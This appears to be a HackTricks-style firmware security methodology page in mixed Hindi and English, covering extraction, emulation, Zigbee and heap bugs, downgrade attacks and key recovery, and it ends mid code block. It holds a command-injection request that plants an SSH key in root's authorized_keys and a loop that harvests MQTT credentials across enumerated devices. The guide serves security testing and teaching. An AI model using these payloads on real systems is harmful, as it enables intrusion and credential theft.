# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **परिचय**

### संबंधित resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware आवश्यक software है, जो hardware components और users द्वारा interact किए जाने वाले software के बीच communication को manage और facilitate करके devices को सही ढंग से operate करने में सक्षम बनाता है। यह permanent memory में stored रहता है, जिससे device के powered on होते ही vital instructions उपलब्ध हो जाती हैं और operating system launch हो जाता है। Security vulnerabilities की पहचान करने में firmware की जांच करना और संभावित रूप से उसे modify करना एक critical step है।<sup>[[2]](#references)[[3]](#references)</sup>

## **Information Gathering**

**Information gathering** किसी device की संरचना और उसके द्वारा उपयोग की जाने वाली technologies को समझने का एक critical initial step है। इस process में निम्नलिखित data collect किया जाता है:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader की specifics
- Hardware layout और datasheets
- Codebase metrics और source locations
- External libraries और license types
- Update histories और regulatory certifications
- Architectural और flow diagrams
- Security assessments और identified vulnerabilities

इस उद्देश्य के लिए, **open-source intelligence (OSINT)** tools बहुत उपयोगी हैं। उपलब्ध open-source software components का manual और automated review processes के माध्यम से analysis भी उतना ही महत्वपूर्ण है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools free static analysis प्रदान करते हैं, जिनका उपयोग potential issues खोजने के लिए किया जा सकता है।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके हो सकते हैं, जिनमें से प्रत्येक की complexity अलग होती है:

- Source (developers, manufacturers) से **सीधे**
- उपलब्ध instructions से इसे **build** करके
- Official support sites से **download** करके
- Hosted firmware files खोजने के लिए **Google dork** queries का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools से **cloud storage** को सीधे access करके
- Man-in-the-middle techniques के माध्यम से **updates** intercept करके
- **UART**, **JTAG**, या **PICit** जैसे connections के माध्यम से device से **extract** करके
- Device communication के भीतर update requests के लिए **sniffing** करके
- **Hardcoded update endpoints** को identify और use करके
- Bootloader या network से **dumping** करके
- जब अन्य सभी तरीके विफल हो जाएं, तो appropriate hardware tools का उपयोग करके storage chip को **remove और read** करके

### केवल UART logs: flash में U-Boot env के माध्यम से root shell force करना

यदि UART RX ignore किया जाता है (केवल logs मिलते हैं), तो भी आप offline **U-Boot environment blob को edit** करके init shell force कर सकते हैं:<sup>[[6]](#references)</sup>

1. SOIC-8 clip और programmer (3.3V) के साथ SPI flash dump करें:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition locate करें, `bootargs` को edit करके उसमें `init=/bin/sh` शामिल करें, और **U-Boot env CRC32** को blob के लिए फिर से compute करें।
3. केवल env partition को reflash करें और reboot करें; UART पर एक shell दिखाई देनी चाहिए।

यह उन embedded devices पर उपयोगी है, जहां bootloader shell disabled है, लेकिन external flash access के माध्यम से env partition writable है।

## Firmware का analysis

अब जब आपके पास **firmware है**, तो आपको इसके बारे में information extract करनी होगी, ताकि पता चल सके कि इसके साथ कैसे व्यवहार करना है। इसके लिए आप अलग-अलग tools का उपयोग कर सकते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
यदि आपको उन tools से अधिक जानकारी नहीं मिलती है, तो `binwalk -E <bin>` से image की **entropy** जांचें। यदि entropy कम है, तो इसके encrypted होने की संभावना कम है। यदि entropy अधिक है, तो इसके encrypted होने की संभावना है (या किसी तरह compressed है)।

इसके अलावा, आप इन tools का उपयोग **firmware के अंदर embedded files** को extract करने के लिए कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file का निरीक्षण करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग कर सकते हैं।

### File System प्राप्त करना

ऊपर बताए गए tools, जैसे `binwalk -ev <bin>`, से आपको **file system extract** करने में सक्षम होना चाहिए।\
Binwalk आमतौर पर इसे **file system type के नाम वाले folder** के अंदर extract करता है, जो आमतौर पर निम्न में से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs।

#### Manual File System Extraction

कभी-कभी binwalk की signatures में file system का **magic byte** नहीं होता। ऐसे मामलों में, binary में file system का offset **find** करने और compressed file system को binary से **carve** करने के लिए binwalk का उपयोग करें, फिर नीचे दिए गए steps का उपयोग करके उसके type के अनुसार file system को **manually extract** करें।
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem को carve करने के लिए निम्नलिखित **dd command** चलाएँ।
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
वैकल्पिक रूप से, निम्न command भी run की जा सकती है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद files "`squashfs-root`" directory में होंगी।

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs filesystems के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware का Analysis

एक बार firmware प्राप्त हो जाने के बाद, इसकी structure और संभावित vulnerabilities को समझने के लिए इसे dissect करना आवश्यक है। इस process में firmware image से valuable data का analysis और extraction करने के लिए विभिन्न tools का उपयोग किया जाता है।

### Initial Analysis Tools

Binary file (जिसे `<bin>` कहा गया है) के initial inspection के लिए commands का एक set दिया गया है। ये commands file types की पहचान करने, strings extract करने, binary data का analysis करने और partition तथा filesystem details को समझने में सहायता करती हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Image की encryption status का आकलन करने के लिए, `binwalk -E <bin>` से **entropy** जाँची जाती है। Low entropy encryption की कमी का संकेत देती है, जबकि high entropy संभावित encryption या compression को दर्शाती है।

**embedded files** निकालने के लिए, **file-data-carving-recovery-tools** documentation और file inspection के लिए **binvis.io** जैसे tools और resources recommended हैं।

### Filesystem निकालना

`binwalk -ev <bin>` का उपयोग करके आमतौर पर filesystem निकाला जा सकता है, अक्सर filesystem type (जैसे, squashfs, ubifs) के नाम वाली directory में। हालांकि, missing magic bytes के कारण जब **binwalk** filesystem type को पहचानने में विफल रहता है, तो manual extraction आवश्यक होता है। इसमें filesystem का offset खोजने के लिए `binwalk` का उपयोग करना और उसके बाद filesystem को carve out करने के लिए `dd` command चलाना शामिल है:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
इसके बाद, filesystem के प्रकार (जैसे squashfs, cpio, jffs2, ubifs) के आधार पर contents को manually extract करने के लिए अलग-अलग commands का उपयोग किया जाता है।

### Filesystem Analysis

Filesystem extract हो जाने के बाद security flaws की खोज शुरू होती है। insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

**प्रमुख locations** और **inspect की जाने वाली items** में शामिल हैं:

- user credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे के analysis के लिए embedded binaries
- सामान्य IoT device web servers और binaries

Filesystem के भीतर sensitive information और vulnerabilities खोजने में कई tools सहायता करते हैं:

- sensitive information search के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries पर Security Checks

Filesystem में मिले source code और compiled binaries, दोनों की vulnerabilities के लिए सावधानीपूर्वक जांच की जानी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools उन unprotected binaries की पहचान करने में सहायता करते हैं जिनका exploitation किया जा सकता है।

## derived URL tokens के माध्यम से cloud config और MQTT credentials प्राप्त करना

कई IoT hubs अपने per-device configuration को ऐसे दिखने वाले cloud endpoint से fetch करते हैं:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान आपको पता चल सकता है कि `<token>` को device ID से locally, hardcoded secret का उपयोग करके derive किया जाता है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

यह design किसी भी ऐसे व्यक्ति को URL reconstruct करने और cloud config pull करने में सक्षम बनाता है, जिसे deviceId और STATIC_KEY पता हो। इससे अक्सर plaintext MQTT credentials और topic prefixes उजागर हो जाते हैं।

Practical workflow:

1) UART boot logs से deviceId extract करें

- 3.3V UART adapter (TX/RX/GND) से connect करें और logs capture करें:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern और broker address print करने वाली lines देखें, उदाहरण के लिए:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware से STATIC_KEY और token algorithm recover करें

- Binaries को Ghidra/radare2 में load करें और config path ("/pf/") या MD5 usage खोजें।
- Algorithm की पुष्टि करें (जैसे, MD5(deviceId||STATIC_KEY))।
- Bash में token derive करें और digest को uppercase करें:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config और MQTT credentials collect करें

- URL तैयार करें और curl से JSON प्राप्त करें; secrets निकालने के लिए jq से parse करें:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT और weak topic ACLs का दुरुपयोग करें (यदि मौजूद हों)

- maintenance topics को subscribe करने और sensitive events खोजने के लिए recovered credentials का उपयोग करें:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) predictable device IDs को enumerate करें (at scale, authorization के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद sequential suffix embed होता है।
- आप candidate IDs को iterate कर सकते हैं, tokens derive कर सकते हैं और programmatically configs fetch कर सकते हैं:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Mass enumeration का प्रयास करने से पहले हमेशा explicit authorization प्राप्त करें।
- जब संभव हो, target hardware को modify किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।

Firmware को emulate करने की प्रक्रिया किसी device के operation या किसी individual program का **dynamic analysis** सक्षम बनाती है। इस approach में hardware या architecture dependencies से जुड़ी challenges आ सकती हैं, लेकिन root filesystem या specific binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या पहले से तैयार virtual machine में transfer करने से आगे की testing आसान हो सकती है।

### Individual Binaries को Emulate करना

Single programs की जांच के लिए program की endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए यह command उपयोग की जा सकती है:
```bash
file ./squashfs-root/bin/busybox
```
और आवश्यक emulation tools install करने के लिए:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` का चयन किया जाएगा।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है, जिसमें emulation के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) और अन्य tools full firmware emulation की सुविधा देते हैं, process को automate करते हैं और dynamic analysis में सहायता करते हैं।

## Dynamic Analysis in Practice

इस चरण में analysis के लिए किसी वास्तविक या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। Emulation hardware interactions की पूरी तरह सटीक नकल नहीं कर सकती, इसलिए कभी-कभी emulation को restart करना पड़ सकता है। Analysis में filesystem की फिर से जांच करनी चाहिए, exposed webpages और network services का exploit करना चाहिए, तथा bootloader vulnerabilities का पता लगाना चाहिए। संभावित backdoor vulnerabilities की पहचान करने के लिए firmware integrity tests महत्वपूर्ण हैं।

## Runtime Analysis Techniques

Runtime analysis में किसी process या binary के operating environment के साथ interaction किया जाता है। इसके लिए gdb-multiarch, Frida और Ghidra जैसे tools का उपयोग breakpoints सेट करने तथा fuzzing और अन्य techniques के माध्यम से vulnerabilities की पहचान करने के लिए किया जाता है।

बिना full debugger वाले embedded targets के लिए, **एक statically-linked `gdbserver` को device पर copy करें और remotely attach करें**:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hubs पर RF stack अक्सर एक **radio MCU** और Linux userland process के बीच विभाजित होता है। एक उपयोगी workflow है कि path को map किया जाए:<sup>[[8]](#references)</sup>

1. हवा में मौजूद **RF frame**
2. radio MCU पर मौजूद **controller-side parser**
3. Linux को forward किया जाने वाला **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. main daemon में मौजूद **application dispatcher**
5. **protocol-specific handler / state machine**

यह architecture एक के बजाय reversing के लिए दो targets बनाता है। यदि controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो निम्न चीज़ें recover करें:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से स्वयं controller से
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers केवल **commissioning**, discovery या firmware/model download phases के दौरान reachable होते हैं

Zigbee के लिए विशेष रूप से pairing traffic capture करें और जाँचें कि target अभी भी default **Link Key** `ZigBeeAlliance09` पर निर्भर है या नहीं। यदि ऐसा है, तो commissioning traffic को sniff करने से **Network Key** उजागर हो सकती है। Zigbee 3.0 install codes इस exposure को कम करते हैं, इसलिए ध्यान दें कि tested device वास्तव में उन्हें enforce करता है या नहीं।

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम battle-tested validation वाले **custom parsing code** और internal **FSMs** को feed करते हैं।<sup>[[8]](#references)</sup>

Practical workflow:

- command dispatcher को reverse करें, जब तक **vendor-only handler** न मिल जाए।
- **FSM state**, **event**, **check**, **action**, और **next-state** tables recover करें।
- उन **transitional states** की पहचान करें जो auto-advance होते हैं, तथा उन retry/error branches की भी जो अंततः attacker-controlled state को reset या free करती हैं।
- पुष्टि करें कि daemon को vulnerable state में रखने के लिए कौन-से legitimate protocol exchanges आवश्यक हैं; यह न मानें कि buggy handler हमेशा reachable है।

Timing-sensitive protocols के लिए Python framework से packet replay बहुत धीमा हो सकता है। अधिक reliable approach है कि real hardware (उदाहरण के लिए एक **nRF52840**) पर vendor-grade stack के साथ legitimate device को emulate किया जाए, ताकि आप सही **endpoints**, **attributes**, और commissioning timing expose कर सकें।

### Fragmented-download bug class in embedded daemons

एक recurring firmware bug class **fragmented blob/model/configuration downloads** में दिखाई देती है:<sup>[[8]](#references)</sup>

1. **पहला fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields को validate करते हैं, जैसे `packet_total_size >= offset + chunk_len`।
3. Copy `memcpy(&ctx->buffer[offset], chunk, chunk_len)` का उपयोग करती है, लेकिन **original allocated size** के विरुद्ध जाँच नहीं करती।

इससे attacker निम्न कर सकता है:

- **small** declared total size वाला पहला valid fragment भेजकर छोटा heap allocation force करना।
- **expected offset** के साथ बाद में बड़ा `chunk_len` वाला fragment भेजना।
- forged packet-local size भेजना, जो fresh checks को satisfy करे और फिर भी originally allocated buffer को overflow करे।

जब vulnerable path commissioning logic के पीछे हो, तो exploitation में target को malformed fragments भेजने से पहले expected model-download या blob-download state में पहुँचाने के लिए पर्याप्त **device emulation** शामिल होनी चाहिए।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतज़ार करना" नहीं, बल्कि protocol के अपने error handling को **force** करना होता है:<sup>[[8]](#references)</sup>

- malformed follow-up fragments भेजकर FSM को **retry** या **error** states में पहुँचाएँ।
- retry threshold पार करें ताकि daemon **context reset** करे और corrupted buffer को free करे।
- इस predictable `free()` का उपयोग allocator-side primitives trigger करने के लिए करें, इससे पहले कि process असंबंधित कारणों से crash हो।

यह embedded Linux में **musl/uClibc/dlmalloc-like** allocators के विरुद्ध विशेष रूप से उपयोगी है, जहाँ chunk metadata को corrupt करने से unlink/unbin logic को write primitive में बदला जा सकता है। एक stable pattern है कि **size field** को corrupt करके allocator traversal को overflowed buffer के भीतर staged **fake chunks** की ओर redirect किया जाए, बजाय इसके कि वास्तविक bin pointers को तुरंत clobber करके process crash कराया जाए।

## Binary Exploitation and Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC develop करने हेतु target architecture की गहरी समझ और lower-level languages में programming आवश्यक है। Embedded systems में binary runtime protections दुर्लभ हैं, लेकिन जब वे मौजूद हों, तो Return Oriented Programming (ROP) जैसी techniques आवश्यक हो सकती हैं।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc glibc के समान fastbins का उपयोग करता है। बाद का large allocation `__malloc_consolidate()` trigger कर सकता है, इसलिए किसी भी fake chunk को checks (सane size, `fd = 0`, और surrounding chunks का "in use" दिखाई देना) पास करना होगा।<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** यदि ASLR enabled है लेकिन main binary **non-PIE** है, तो in-binary `.data/.bss` addresses stable होते हैं। आप ऐसे region को target कर सकते हैं जो पहले से valid heap chunk header जैसा दिखता हो, ताकि fastbin allocation को **function pointer table** पर land कराया जा सके।
- **Parser-stopping NUL:** जब JSON parse किया जाता है, तो payload में मौजूद `\x00` parsing रोक सकता है और stack pivot/ROP chain के लिए trailing attacker-controlled bytes को बनाए रख सकता है।
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()`, और `write()` call करने वाली ROP chain किसी known mapping में executable shellcode रख सकती है और उस पर jump कर सकती है।

## Firmware Analysis के लिए Prepared Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems firmware security testing के लिए pre-configured environments प्रदान करते हैं, जिनमें आवश्यक tools मौजूद होते हैं।

## Firmware का analysis करने के लिए Prepared OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है, जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में सहायता करना है। यह सभी आवश्यक tools से loaded pre-configured environment प्रदान करके आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से loaded हैं।

## Firmware Downgrade Attacks & Insecure Update Mechanisms

भले ही vendor firmware images के लिए cryptographic signature checks लागू करे, **version rollback (downgrade) protection अक्सर omitted रहती है**। जब boot- या recovery-loader embedded public key से केवल signature verify करता है, लेकिन flash की जा रही image के *version* (या monotonic counter) की तुलना नहीं करता, तो attacker वैध रूप से **पुराना, vulnerable firmware** install कर सकता है, जिस पर valid signature अभी भी मौजूद होती है, और इस प्रकार patched vulnerabilities को फिर से introduce कर सकता है।<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **एक पुरानी signed image प्राप्त करें**
* इसे vendor के public download portal, CDN या support site से प्राप्त करें।
* इसे companion mobile/desktop applications से extract करें (जैसे Android APK के अंदर `assets/firmware/` में)।
* इसे VirusTotal, Internet archives, forums आदि जैसे third-party repositories से retrieve करें।
2. किसी exposed update channel के माध्यम से image को device पर **upload या serve करें**:
* Web UI, mobile-app API, USB, TFTP, MQTT आदि।
* कई consumer IoT devices *unauthenticated* HTTP(S) endpoints expose करते हैं, जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade trigger करते हैं।
3. Downgrade के बाद उस vulnerability का exploit करें जिसे newer release में patch किया गया था (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. Persistence प्राप्त होने के बाद detection से बचने के लिए वैकल्पिक रूप से latest image को फिर से flash करें या updates disable करें।

### Example: Downgrade के बाद Command Injection
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Vulnerable (downgraded) firmware में `md5` parameter को बिना sanitisation के सीधे shell command में concatenate किया जाता है, जिससे arbitrary commands inject किए जा सकते हैं (यहां SSH key-based root access enable किया जा रहा है)। बाद के firmware versions में एक basic character filter जोड़ा गया, लेकिन downgrade protection न होने के कारण यह fix निष्प्रभावी हो जाता है।<sup>[[4]](#references)</sup>

### Mobile Apps से Firmware Extract करना

कई vendors अपने companion mobile applications के अंदर full firmware images bundle करते हैं, ताकि app Bluetooth/Wi-Fi के माध्यम से device को update कर सके। ये packages आमतौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths के अंतर्गत unencrypted रूप में stored होते हैं। `apktool`, `ghidra`, या साधारण `unzip` जैसे tools physical hardware को छुए बिना signed images को pull करने की अनुमति देते हैं।<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot designs में केवल Updater-आधारित anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic के अंदर (उदाहरण के लिए CAN पर UDS routine, recovery command, या userspace OTA agent)। यदि **bootloader** बाद में केवल image signature/CRC जाँचता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को अभी भी bypass किया जा सकता है।<sup>[[7]](#references)</sup>

सामान्य कमजोर design:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter दोनों होते हैं।
- Updater image ratchet की तुलना persistent storage में संग्रहीत value से करता है और पुराने signed images को reject करता है।
- Bootloader उस ratchet को **parse** नहीं करता और boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को partition table या per-slot generation counter में अलग से store किया जाता है और इसे validated exact firmware digest से **cryptographically bound** नहीं किया जाता।

इससे dual-slot systems में **validate-one-image / boot-another-image** primitive बनता है। यदि attacker updater से slot B को current signed image का उपयोग करके next boot target mark करवा सकता है और reboot से पहले slot B को overwrite कर सकता है, तो bootloader downgraded image को boot कर सकता है, क्योंकि वह केवल पहले से committed slot metadata पर भरोसा करता है।

सामान्य abuse pattern:

1. Passive slot में **current signed** firmware upload करें और normal validation/switch routine चलाएँ, ताकि layout उस slot को next active के रूप में mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine में दोबारा प्रवेश करें।
3. Stale boot-state या stale slot-selection logic का abuse करें, ताकि updater उसी slot को erase करे जिसे अभी promote किया गया है।
4. उस slot में **older but still signed** firmware लिखें।
5. Ratchet लागू करने वाली validation routine को skip करें और सीधे reboot करें।
6. Bootloader promoted slot को select करता है, केवल signature/integrity verify करता है और old image को boot कर देता है।

A/B update implementations को reverse करते समय इन बातों को देखें:

- **Boot-time flags** से derived slot selection, जिन्हें successful switch के बाद refresh नहीं किया जाता।
- `prepare_passive_slot()`-style routine, जो **current committed layout** के बजाय stale state के आधार पर slot erase करती है।
- `part_write_layout()`-style function, जो केवल **generation counter** / active flag बढ़ाता है और validated image hash store नहीं करता।
- Userspace या updater code में लागू ratchet checks, लेकिन ROM / bootloader / secure boot stages में **नहीं**।
- Erase या recovery routines, जो slot का content हटाने और दोबारा लिखने के बाद भी उसे bootable mark छोड़ देती हैं।

### Update Logic का Assessment Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से protected है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के अंदर verify किया जाता है (जैसे signatures को ROM code द्वारा check किया जाता है)?
* क्या **bootloader updater के समान ratchet लागू करता है**, बजाय केवल signature/CRC check करने के?
* क्या slot activation metadata **validated firmware digest/version से bound** है, या promotion के बाद slot को modify किया जा सकता है?
* Slot switch सफल होने के बाद क्या device को reboot करने के लिए बाध्य किया जाता है, या उसी session में बाद की update/erase routines अभी भी reachable रहती हैं?
* क्या userland code additional sanity checks करता है (जैसे allowed partition map, model number)?
* क्या *partial* या *backup* update flows उसी validation logic का पुनः उपयोग करते हैं?

> 💡  यदि ऊपर दी गई किसी भी चीज़ का अभाव है, तो platform rollback attacks के प्रति संभवतः vulnerable है।

## अभ्यास के लिए Vulnerable firmware

Firmware में vulnerabilities खोजने का अभ्यास करने के लिए, निम्नलिखित vulnerable firmware projects को starting point के रूप में उपयोग करें।

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state से firmware decryption keys recover करना

जब कोई update image छोटे plaintext metadata को बड़े high-entropy blob के साथ मिलाती है, तो किसी भी brute-forcing से पहले container triage करें:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` और `binwalk -E` से headers, offsets और line boundaries dump करें।
- `Salted__` आमतौर पर OpenSSL `enc` format को दर्शाता है: अगले 8 bytes salt होते हैं और शेष bytes ciphertext होते हैं।
- ऐसा Base64 field जो decode होकर ठीक `256` bytes का बनता है, यह मजबूत संकेत है कि आप RSA-2048 ciphertext देख रहे हैं, जो random firmware password/session key को wrap करता है।
- उसी file में मौजूद Detached PGP material अक्सर केवल authenticity को protect करता है; यह न मानें कि यही confidentiality mechanism है।

यदि static key hunting (`grep`, `strings`, PEM/PGP searches) विफल हो, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary को decompile करें और trace करें कि encrypted blob को कौन पढ़ता है, कौन-सा helper/API उसे unwrap करता है और वह किस logical key name का अनुरोध करता है।
- Extracted root filesystem में KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) के साथ unit files और init scripts खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens या local KMS auto-unseal scripts को private-key material के equivalent मानें।

यदि appliance original Vault binary और storage backend के साथ ship होता है, तो Vault internals को फिर से implement करने की तुलना में उस environment को replay करना आमतौर पर आसान होता है:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
